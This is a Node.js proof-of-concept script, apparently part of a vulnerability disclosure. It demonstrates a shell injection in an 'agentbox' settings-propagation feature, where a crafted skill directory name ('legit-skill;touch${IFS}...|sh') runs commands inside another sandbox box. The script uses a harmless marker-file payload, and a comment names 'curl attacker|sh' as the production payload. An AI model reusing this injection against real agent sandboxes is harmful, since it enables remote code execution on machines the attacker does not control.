#!/usr/bin/env node
//
// PoC: Cross-box RCE via shell injection in the settings-propagate sync transport
// ---------------------------------------------------------------------------
// `agentbox download claude <src> --propagate all|project` copies skills/agents/
// commands from a SOURCE box into every OTHER running box. The item names are
// directory basenames from the source box's ~/.claude (agent-controlled: a Linux
// dir name may contain ; $ { } | ` -- only / and NUL are excluded). They are
// filtered only for host-presence / `agentbox-` prefix, never for shell metachars
// (claude-pull.ts pickNewItems), then reach the TARGET box through:
//
//   transportSettingsTarget(t, boxDir, label).copyIn(stage, 'skills/<name>', 'dir')
//     -> t.pushTree(stage, `${boxDir}/skills/<name>`)          // agent-propagate.ts:146,170-173
//        -> transport.applyTarball(localTar, `${boxDir}/skills/<name>`)
//           -> backend.exec(handle,
//                `tar -xf ${remoteTar} -C ${boxDestDir} ... && rm -f ${remoteTar}`)  // sync-transport.ts:62-65
//
// `boxDestDir` (which embeds the attacker name) is interpolated UNQUOTED into a
// shell string handed to backend.exec -- for a cloud backend that is a shell in
// the TARGET box (e2b `sb.commands.run`, etc.). `exec()` elsewhere is safe
// because it routes argv through quoteShellArgv; applyTarball/pushFile build raw
// strings and bypass it.
//
// This PoC drives the REAL createCloudSyncTransport (packages/sandbox-cloud/dist)
// with a mock CloudBackend whose exec IS the target box's shell, and reproduces
// the exact destDir the propagate wrapper computes. The injected command runs in
// the target -- a box the attacker does not control.
//
// Run: node poc.mjs   (needs `pnpm --filter @agentbox/sandbox-cloud... build`)

import { createCloudSyncTransport } from '../../../packages/sandbox-cloud/dist/index.js';
import { mkdtempSync, mkdirSync, writeFileSync, existsSync, rmSync, copyFileSync } from 'node:fs';
import { execFileSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join, basename } from 'node:path';

const bold = (s) => `\x1b[1m${s}\x1b[0m`;
const red = (s) => `\x1b[1;31m${s}\x1b[0m`;
const green = (s) => `\x1b[1;32m${s}\x1b[0m`;
const say = (s) => console.log(`\n${bold('== ' + s + ' ==')}`);
const info = (s) => console.log('   ' + s);

const WORK = mkdtempSync(join(tmpdir(), 'agentbox-xbox-poc.'));
const TARGET_BOX = join(WORK, 'target-box-fs'); // stands in for the victim box's filesystem
const MARKER = join(WORK, 'RCE_IN_TARGET_BOX');
mkdirSync(TARGET_BOX, { recursive: true });

// A mock CloudBackend. exec(handle, cmd) models the TARGET box's shell (e2b's
// sb.commands.run(cmd), vercel's runtime.runCommand, etc. all run a shell string).
const execedCommands = [];
const backend = {
  name: 'mock',
  async exec(_handle, cmd) {
    execedCommands.push(cmd);
    try {
      const out = execFileSync('/bin/sh', ['-c', cmd], { cwd: TARGET_BOX, encoding: 'utf8' });
      return { exitCode: 0, stdout: out, stderr: '' };
    } catch (e) {
      // tar fails on the bogus dir (after the injected `;` has already run) -> nonzero
      return { exitCode: e.status ?? 1, stdout: e.stdout?.toString() ?? '', stderr: e.stderr?.toString() ?? '' };
    }
  },
  async uploadFile(_handle, hostPath, remotePath) {
    const dest = join(TARGET_BOX, basename(remotePath));
    copyFileSync(hostPath, dest);
  },
  // no ensureVolume -> caps.helperContainer/persistentVolumes off (ephemeral cloud fs)
};

async function main() {
  say('1. Attacker plants a malicious skill directory name in the SOURCE box');
  // A valid Linux directory name; ${IFS} supplies spaces so it survives the
  // inventory parse (parseClaudeInventory keeps the tail after the first space).
  const evilName = 'legit-skill;touch${IFS}' + MARKER + '|sh';
  const stage = join(WORK, 'staging', 'skills', evilName);
  mkdirSync(stage, { recursive: true });
  writeFileSync(join(stage, 'SKILL.md'), '# looks legit\n');
  info(`source ~/.claude/skills/ entry: ${evilName}`);

  say('2. Victim runs `download claude <attacker-box> --propagate` -> real sync transport into the TARGET box');
  const transport = createCloudSyncTransport({ backend, handle: { id: 'target-box' } });

  // Exactly what transportSettingsTarget(t, boxDir, 'victim').copyIn(stage, rel, 'dir')
  // computes: abs(rel) = `${boxDir}/${rel}` with rel = `skills/<name>` (agent-propagate.ts:146,173).
  const boxDir = '/home/vscode/.claude';
  const boxDestDir = `${boxDir}/skills/${evilName}`;
  info(`propagate computes boxDestDir = ${boxDestDir}`);
  info('calling the REAL transport.pushTree(...) -> applyTarball(...) (sync-transport.ts sink)');

  if (existsSync(MARKER)) rmSync(MARKER);
  try {
    await transport.pushTree(stage, boxDestDir, { exclude: ['node_modules'] });
  } catch (e) {
    info(`(pushTree threw after the injection ran, as expected: ${String(e.message).slice(0, 70)}...)`);
  }

  say('3. Result');
  const cmd = execedCommands.find((c) => c.includes('tar -xf')) ?? execedCommands[0] ?? '';
  console.log('   command applyTarball ran in the target box:');
  console.log('     ' + cmd.replace(MARKER, '<MARKER>'));
  const ok = existsSync(MARKER);
  if (ok) {
    console.log('\n' + red('VULNERABLE') + ' -- a box-controlled name executed a command inside a DIFFERENT box.');
    info(`marker created in the target box context: ${MARKER}`);
    info('In production the payload would be e.g. `curl attacker|sh`, running as the target box user (passwordless sudo).');
  } else {
    console.log('\n' + green('NOT reproduced') + ' -- no injected command executed.');
  }
  rmSync(WORK, { recursive: true, force: true });
  process.exit(ok ? 0 : 1);
}

main().catch((e) => { console.error(e); process.exit(2); });
